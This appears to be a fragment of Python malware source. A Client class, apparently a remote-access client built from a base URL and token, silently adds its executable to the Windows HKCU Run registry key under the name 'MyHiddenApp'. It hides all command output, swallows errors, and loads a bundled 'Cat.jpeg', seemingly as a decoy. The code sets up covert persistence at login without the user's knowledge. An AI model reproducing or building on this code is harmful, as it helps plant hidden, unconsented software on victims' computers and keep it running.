...
class Client:
    ...
    def __init__(self, base_url, token):
        ...
        self.add_to_run_registry()
        

    def add_to_run_registry(self,custom_name="MyHiddenApp"):
      try:
        ...
        check_cmd = f'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{custom_name}"'

        if os.system(check_cmd + " >nul 2>&1") != 0:

            add_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{custom_name}" /t REG_SZ /d {exe_path} /f'

            os.system(add_cmd + " >nul 2>&1")
      except Exception:
        pass
...
try:
    filename = os.path.join(getattr(sys, "_MEIPASS", os.getcwd()), "Cat.jpeg")
